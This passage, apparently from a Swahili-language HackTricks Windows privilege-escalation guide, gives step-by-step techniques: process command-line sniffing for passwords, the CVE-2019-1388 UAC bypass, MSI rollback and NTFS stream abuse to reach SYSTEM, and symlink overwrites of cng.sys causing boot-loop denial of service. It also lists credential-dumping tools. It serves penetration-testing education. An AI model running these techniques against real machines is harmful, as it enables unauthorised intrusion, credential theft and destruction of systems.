### Matumizi mabaya ya Protocol handler / ShellExecute kupitia Markdown renderers

Viungo vya Markdown vinavyoweza kubonyezwa na kutumwa kwa `ShellExecuteExW` vinaweza kuanzisha URI handlers hatari (`file:`, `ms-appinstaller:` au scheme yoyote iliyosajiliwa) na kuendesha faili zinazodhibitiwa na mshambulizi kama user wa sasa. Angalia:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Kufuatilia Command Lines ili kupata passwords**

Unapopata shell kama user, huenda kukawa na scheduled tasks au processes nyingine zinazoendeshwa ambazo **hupitisha credentials kwenye command line**. Script iliyo hapa chini hunasa command lines za processes kila baada ya sekunde mbili na kulinganisha hali ya sasa na hali iliyotangulia, kisha kutoa tofauti zozote.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Kuiba nywila kutoka kwa michakato

## Kutoka kwa mtumiaji asiye na ruhusa za juu hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa unaweza kufikia kiolesura cha picha (kupitia console au RDP) na UAC imewashwa, katika baadhi ya matoleo ya Microsoft Windows inawezekana kuendesha terminal au mchakato mwingine wowote kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na ruhusa za juu.

Hii hurahisisha kupandisha ruhusa na kukwepa UAC kwa wakati mmoja kwa kutumia udhaifu huohuo. Zaidi ya hayo, hakuna haja ya kusakinisha chochote, na binary inayotumiwa wakati wa mchakato imesainiwa na kutolewa na Microsoft.

Baadhi ya mifumo iliyoathiriwa ni hii ifuatayo:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Ili ku-exploit udhaifu huu, ni muhimu kutekeleza hatua zifuatazo:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Una faili na taarifa zote zinazohitajika katika repository hii ya GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Kutoka Administrator Medium hadi High Integrity Level / UAC Bypass

Soma hii ili **ujifunze kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hii ili ujifunze kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kuingiza Upload Directory Junctions kwenye Served Root

Programu inaweza kuunda upload subdirectory inayotabirika, kuandika jina la faili lililotolewa na caller ndani yake, kisha kuchakata faili hilo. Ikiwa mtumiaji mwenye privilege ndogo anaweza kuondoa na kubadilisha subdirectory hiyo na NTFS junction kabla ya write ya upande wa server, write inaweza kufuata junction hadi kwenye directory inayotolewa kupitia web. Script iliyowekwa hapo inaweza kutekelezwa kwa utambulisho wa web-service ikiwa server hutekeleza aina hiyo ya faili. Hii ni mpaka wa arbitrary-write unaotegemea programu mahususi; kuwa na upload directory inayoweza kuandikwa au junction iliyopo pekee hakuthibitishi hilo.

Kagua uundaji halisi wa path na muda wake katika upload handler, ruhusa halisi za mtumiaji za kufuta/kuunda subdirectory, ACLs halisi za destination, iwapo writer hufuata reparse points, na iwapo web server hutekeleza faili kwenye destination hiyo. Thibitisha kando utambulisho wa process za writer na web server. Passive inventory inaweza kuonyesha directory ACLs na reparse metadata, lakini haiwezi kuthibitisha tabia ya handler au ubadilishaji wa junction utakaofanyika baadaye. Ikiwa execution itafanyika katika service account, kagua **process token halisi** kabla ya kuzingatia njia tofauti ya token-privilege.

## Kutoka Arbitrary Folder Delete/Move/Rename hadi SYSTEM EoP

Mbinu iliyoelezwa [**katika chapisho hili la blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) yenye exploit code [**inayopatikana hapa**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Shambulio hili kimsingi linatumia vibaya kipengele cha rollback cha Windows Installer ili kubadilisha faili halali na faili hasidi wakati wa mchakato wa uninstallation. Kwa hili mshambuliaji anahitaji kuunda **MSI installer hasidi** itakayotumika kuteka nyara folda ya `C:\Config.Msi`, ambayo baadaye itatumiwa na Windows Installer kuhifadhi rollback files wakati wa uninstallation ya MSI packages nyingine, ambapo rollback files zitakuwa zimebadilishwa ili ziwe na malicious payload.

Muhtasari wa mbinu hii ni kama ifuatavyo:

1. **Hatua ya 1 – Kujiandaa kwa Hijack (acha `C:\Config.Msi` ikiwa tupu)**

- Hatua ya 1: Install MSI
    - Unda `.msi` inayosakinisha faili isiyo na madhara (kwa mfano, `dummy.txt`) kwenye folder inayoweza kuandikwa (`TARGETDIR`).
    - Weka alama kuwa installer ni **"UAC Compliant"**, ili **mtumiaji asiye admin** aweze kuiendesha.
    - Acha **handle** ikiwa wazi kwa faili baada ya install.

- Hatua ya 2: Anza Uninstall
    - Fanya uninstall ya `.msi` hiyo hiyo.
    - Mchakato wa uninstall huanza kuhamisha faili hadi `C:\Config.Msi` na kuzibadilisha majina kuwa faili za `.rbf` (rollback backups).
    - **Fuatilia open file handle** kwa kutumia `GetFinalPathNameByHandle` ili kutambua faili inapokuwa `C:\Config.Msi\<random>.rbf`.

- Hatua ya 3: Custom Syncing
    - `.msi` inajumuisha **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
        - Hutoa ishara wakati `.rbf` imeandikwa.
        - Kisha **husubiri** tukio lingine kabla ya kuendelea na uninstall.

- Hatua ya 4: Zuia Kufutwa kwa `.rbf`
    - Ukipokea ishara, **fungua faili ya `.rbf`** bila `FILE_SHARE_DELETE` — hii **huzuia faili kufutwa**.
    - Kisha **tuma ishara ya kurudisha** ili uninstall ikamilike.
    - Windows Installer hushindwa kufuta `.rbf`, na kwa kuwa haiwezi kufuta maudhui yote, **`C:\Config.Msi` haiondolewi**.

- Hatua ya 5: Futa `.rbf` Mwenyewe
    - Wewe (mshambuliaji) futa faili ya `.rbf` mwenyewe.
    - Sasa **`C:\Config.Msi` ni tupu**, tayari kutekwa nyara.

> Kwa wakati huu, **anzisha vulnerability ya SYSTEM-level arbitrary folder delete** ili kufuta `C:\Config.Msi`.

2. **Hatua ya 2 – Kubadilisha Rollback Scripts kwa Hasidi**

- Hatua ya 6: Unda Upya `C:\Config.Msi` kwa Weak ACLs
    - Unda upya folder ya `C:\Config.Msi` mwenyewe.
    - Weka **weak DACLs** (kwa mfano, Everyone:F), na **acha handle wazi** yenye `WRITE_DAC`.

- Hatua ya 7: Endesha Install Nyingine
    - Install `.msi` tena, ukiweka:
        - `TARGETDIR`: Eneo linaloweza kuandikwa.
        - `ERROROUT`: Variable inayosababisha hitilafu ya kulazimishwa.
    - Install hii itatumika kuanzisha **rollback** tena, ambayo husoma `.rbs` na `.rbf`.

- Hatua ya 8: Fuatilia `.rbs`
    - Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` hadi `.rbs` mpya itokee.
    - Hifadhi jina lake la faili.

- Hatua ya 9: Sawazisha Kabla ya Rollback
    - `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
        - Hutoa ishara ya tukio wakati `.rbs` imeundwa.
        - Kisha **husubiri** kabla ya kuendelea.

- Hatua ya 10: Tumia Tena Weak ACL
    - Baada ya kupokea tukio la `.rbs created`:
        - Windows Installer **hutumia tena ACLs kali** kwenye `C:\Config.Msi`.
        - Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza **kutumia tena weak ACLs**.

> ACLs **hutekelezwa tu wakati handle inafunguliwa**, kwa hiyo bado unaweza kuandika kwenye folder.

- Hatua ya 11: Weka Fake `.rbs` na `.rbf`
    - Andika juu ya faili ya `.rbs` ili iwe na **fake rollback script** inayoelekeza Windows:
        - Kurejesha faili yako ya `.rbf` (malicious DLL) kwenye **eneo lenye privileged** (kwa mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Weka fake `.rbf` yako yenye **malicious SYSTEM-level payload DLL**.

- Hatua ya 12: Anzisha Rollback
    - Tuma ishara ya sync event ili installer iendelee.
    - **Type 19 custom action (`ErrorOut`)** imesanidiwa **kufeli install kwa makusudi** katika hatua inayojulikana.
    - Hii husababisha **rollback kuanza**.

- Hatua ya 13: SYSTEM Inasakinisha DLL Yako
    - Windows Installer:
        - Husoma `.rbs` yako hasidi.
        - Hunakili DLL yako ya `.rbf` kwenye eneo lengwa.
    - Sasa una **malicious DLL yako kwenye path inayopakiwa na SYSTEM**.

- Hatua ya Mwisho: Tekeleza SYSTEM Code
    - Endesha **auto-elevated binary** inayoaminika (kwa mfano, `osk.exe`) inayopakia DLL uliyoiteka nyara.
    - **Bum**: Code yako inatekelezwa **kama SYSTEM**.


### Kutoka Arbitrary File Delete/Move/Rename hadi SYSTEM EoP

Mbinu kuu ya MSI rollback (iliyotangulia) inadhania kuwa unaweza kufuta **folder nzima** (kwa mfano, `C:\Config.Msi`). Lakini vipi ikiwa vulnerability yako inaruhusu **kufuta faili kiholela tu**?

Unaweza kutumia vibaya **NTFS internals**: kila folder ina alternate data stream iliyofichwa inayoitwa:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Mtiririko huu huhifadhi **metadata ya index** ya folda.

Kwa hivyo, ukifuta mtiririko wa `::$INDEX_ALLOCATION` wa folda, NTFS **huondoa folda nzima** kwenye mfumo wa faili.

Unaweza kufanya hivyo kwa kutumia API za kawaida za kufuta faili kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Ingawa unaita API ya kufuta *file*, **inafuta folder yenyewe**.

### Kutoka Kufuta Yaliyomo kwenye Folder hadi SYSTEM EoP
Je, ikiwa primitive yako haikuruhusu kufuta files/folders zozote, lakini **inakuruhusu kufuta *yaliyomo* kwenye folder inayodhibitiwa na mshambulizi**?

1. Hatua ya 1: Sanidi folder na file ya chambo
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua ya 2: Weka **oplock** kwenye `file1.txt`
- Oplock **husitisha utekelezaji** wakati mchakato wenye upendeleo unapojaribu kufuta `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Hatua ya 3: Anzisha mchakato wa SYSTEM (kwa mfano, `SilentCleanup`)
- Mchakato huu hukagua folda (kwa mfano, `%TEMP%`) na kujaribu kufuta yaliyomo.
- Unapofikia `file1.txt`, **oplock huanzishwa** na kukabidhi udhibiti kwa callback yako.

4. Hatua ya 4: Ndani ya callback ya oplock – elekeza upya ufutaji

- Chaguo A: Hamisha `file1.txt` mahali pengine
    - Hii husafisha `folder1` bila kuvunja oplock.
    - Usifute `file1.txt` moja kwa moja — kufanya hivyo kungeachilia oplock mapema.

- Chaguo B: Geuza `folder1` kuwa **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Chaguo C: Unda **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Hii inalenga mtiririko wa ndani wa NTFS unaohifadhi metadata ya folda — kuufuta kunafuta folda.

5. Hatua ya 5: Achilia oplock
- Mchakato wa SYSTEM unaendelea na kujaribu kufuta `file1.txt`.
- Lakini sasa, kutokana na junction + symlink, kwa kweli unafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka Kuunda Folda Yoyote Hadi DoS ya Kudumu

Tumia primitive inayokuruhusu **kuunda folda yoyote kama SYSTEM/admin** — hata kama **huwezi kuandika faili** au **kuweka ruhusa dhaifu**.

Unda **folda** (si faili) yenye jina la **driver muhimu ya Windows**, kwa mfano:
```
C:\Windows\System32\cng.sys
```

- Njia hii kwa kawaida inalingana na driver ya kernel-mode `cng.sys`.
- Ukiitengeneza mapema kama folda, Windows hushindwa kupakia driver halisi wakati wa kuwasha.
- Kisha, Windows hujaribu kupakia `cng.sys` wakati wa kuwasha.
- Huona folda hiyo, hushindwa kutambua driver halisi, na mfumo huanguka au mchakato wa kuwasha husimama.
- Hakuna njia mbadala wala urejeshaji bila hatua za nje (kwa mfano, ukarabati wa boot au ufikiaji wa diski).

### Kutoka kwa njia za kumbukumbu/chelezo zenye mamlaka ya juu na OM symlinks hadi overwrite ya faili yoyote / boot DoS

Huduma yenye mamlaka ya juu inapoandika kumbukumbu/exports kwenye njia iliyosomwa kutoka kwa config inayoweza kuandikwa, elekeza upya njia hiyo kwa kutumia Object Manager symlinks + NTFS mount points ili kubadilisha uandishi wenye mamlaka ya juu kuwa overwrite ya faili yoyote (hata bila SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Mahitaji**
- Config inayohifadhi njia lengwa inaweza kuandikwa na mshambuliaji (kwa mfano, `%ProgramData%\...\.ini`).
- Uwezo wa kuunda mount point kuelekea `\RPC Control` na OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Operesheni yenye mamlaka ya juu inayoandika kwenye njia hiyo (kumbukumbu, export, ripoti).

**Mfano wa mlolongo**
1. Soma config ili kupata mahali pa kumbukumbu palipo na mamlaka ya juu, kwa mfano, `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` ndani ya `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Elekeza upya njia hiyo bila admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri component yenye privileged iandike log (kwa mfano, admin aanzishe "send test SMS"). Sasa maandishi yataandikwa kwenye `C:\Windows\System32\cng.sys`.
4. Kagua target iliyoandikwa juu yake (hex/PE parser) ili kuthibitisha uharibifu; kuwasha upya hulazimisha Windows kupakia njia ya driver iliyoharibiwa → **boot loop DoS**. Hii pia inatumika kwa faili yoyote iliyolindwa ambayo huduma yenye privileged itafungua kwa ajili ya kuandika.

> `cng.sys` kwa kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini ikiwa nakala ipo kwenye `C:\Windows\System32\cng.sys`, inaweza kujaribiwa kwanza, na kuifanya kuwa sehemu ya kuaminika ya kuelekeza data iliyoharibika ili kusababisha DoS.



## **Kutoka High Integrity hadi System**

### **Huduma mpya**

Ikiwa tayari unaendesha process ya High Integrity, **njia ya kufikia SYSTEM** inaweza kuwa rahisi: **unda na uendeshe tu huduma mpya**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Unapotengeneza binary ya service, hakikisha ni service halali au binary inatekeleza vitendo vinavyohitajika haraka, kwa sababu itazimwa baada ya sekunde 20 ikiwa si service halali.

### AlwaysInstallElevated

Kutoka kwenye process ya High Integrity unaweza kujaribu **kuwezesha maingizo ya registry ya AlwaysInstallElevated** na **kusakinisha** reverse shell kwa kutumia wrapper ya _**.msi**_.\
[Maelezo zaidi kuhusu registry keys zinazohusika na jinsi ya kusakinisha kifurushi cha _.msi_ hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kupata code hapa**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ikiwa una token privileges hizo (huenda utazipata kwenye process ambayo tayari ina High Integrity), utaweza **kufungua karibu process yoyote** (isipokuwa protected processes) kwa kutumia privilege ya SeDebug, **kunakili token** ya process hiyo, na kuunda **process yoyote kwa kutumia token hiyo**.\
Kwa kawaida, mbinu hii **huchagua process yoyote inayoendeshwa kama SYSTEM yenye token privileges zote** (_ndiyo, unaweza kupata process za SYSTEM zisizo na token privileges zote_).\
**Unaweza kupata** [**mfano wa code inayotekeleza mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Mbinu hii hutumiwa na meterpreter kupandisha privileges katika `getsystem`. Mbinu hii inahusisha **kuunda pipe na kisha kuunda/ kutumia vibaya service ili iandike kwenye pipe hiyo**. Kisha, **server** iliyounda pipe kwa kutumia privilege ya **`SeImpersonate`** itaweza **kuiga token** ya client ya pipe (service), na kupata privileges za SYSTEM.\
Ukitaka [**kujifunza zaidi kuhusu name pipes, soma hapa**](#named-pipe-client-impersonation).\
Ukitaka kusoma mfano wa [**jinsi ya kutoka high integrity hadi System kwa kutumia name pipes, soma hapa**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ukifanikiwa **kuteka dll** inayopakiwa na **process** inayoendeshwa kama **SYSTEM**, utaweza kutekeleza code yoyote kwa permissions hizo. Kwa hiyo, Dll Hijacking pia ni muhimu kwa aina hii ya privilege escalation. Zaidi ya hayo, ni rahisi zaidi **kuitekeleza kutoka kwenye process yenye high integrity**, kwa kuwa itakuwa na **write permissions** kwenye folders zinazotumiwa kupakia dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Zana muhimu

**Zana bora ya kutafuta njia za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Hukagua misconfigurations na mafaili nyeti (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Imetambuliwa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Hukagua baadhi ya misconfigurations zinazowezekana na kukusanya taarifa (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Hukagua misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za session zilizohifadhiwa za PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough kwenye mfumo wa ndani.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa credentials kutoka Credential Manager. Imetambuliwa.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Hujaribu passwords zilizokusanywa kwenye domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni zana ya PowerShell ya ADIDNS/LLMNR/mDNS spoofing na man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Uchanganuzi wa msingi wa Windows privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Hutafuta udhaifu unaojulikana wa privesc (IMESITISHWA; tumia Watson badala yake)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Ukaguzi wa ndani **(Unahitaji haki za Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Hutafuta udhaifu unaojulikana wa privesc (inahitaji ku-compiliwa kwa kutumia VisualStudio) ([**imekwisha compiliwa**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Huchunguza host kutafuta misconfigurations (ni zaidi ya zana ya kukusanya taarifa kuliko ya privesc) (inahitaji ku-compiliwa) **(**[**imekwisha compiliwa**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa credentials kutoka kwenye software nyingi (exe iliyokwisha compiliwa inapatikana github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Toleo la PowerUp lililoandikwa kwa C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Hukagua misconfiguration (executable iliyokwisha compiliwa inapatikana github). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Hukagua misconfigurations zinazowezekana (exe kutoka python). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Zana iliyoundwa kwa kutegemea chapisho hili (haihitaji accesschk ili kufanya kazi ipasavyo, lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (python ya ndani)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (Python ya ndani)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Unahitaji ku-compili project kwa kutumia toleo sahihi la .NET ([angalia hapa](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililosakinishwa kwenye host ya mwathiriwa, unaweza kufanya hivi:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Misingi ya Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Kuongeza privileges kwa kutumia vibaya ruhusa dhaifu za folda](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - mwongozo wa haraka](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Warsha ya Windows / Linux Local Privilege Escalation](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Mashambulizi ya Windows: AT ndiyo mtindo mpya (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Mwongozo kamili wa OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Mwongozo wa Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Orodha hakiki ya Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Mbinu za Windows Privilege Escalation kwa Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Hadaa kupitia SMTP kwa macro ya Word VBA → kusimbua credential za hMailServer → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) na wizi wa kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Kumfuatilia Silver Fox: Paka na Panya kwenye Vivuli vya Kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Athari ya mfumo wa faili yenye privileges za juu iliyopo kwenye mfumo wa SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Zana za kupima Symbolic Link – matumizi ya CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Kiungo cha Zamani. Kutumia vibaya Symbolic Links kwenye Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (toleo la Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Utatuzi hatari wa module kwenye Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: kupakia kutoka kwenye folda za `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Changamoto za orodha hakiki ya C/C++, zikiwa zimetatuliwa](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Kazi ya RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own na Microslop: Kuunganisha hali za mbio za CLDFLT na DirectX Kernel kwa Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [I/O Ring Moja ya Kuwatawala Wote: Primitive kamili ya kusoma/kuandika kwenye Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Kutumia vibaya ufutaji wa faili kiholela ili kuongeza privileges na mbinu nyingine bora](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Msimbo wa exploit wa FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Mashambulizi ya WSUS Sehemu ya 2: CVE-2020-1013, udhaifu wa siku ya kwanza wa Windows 10 Local Privilege Escalation](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Kuchunguza Credential Manager na Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Mabadiliko ya picha yanaposababisha Privilege Escalation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Kutoa funguo za faragha za SSH kutoka kwa Windows 10 SSH agent](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kubadilisha seva za masasisho za biashara kuwa viwanda vya backdoor (0_o) – Sehemu ya 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kubadilisha seva za masasisho za biashara kuwa viwanda vya backdoor (0_o) – Sehemu ya 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
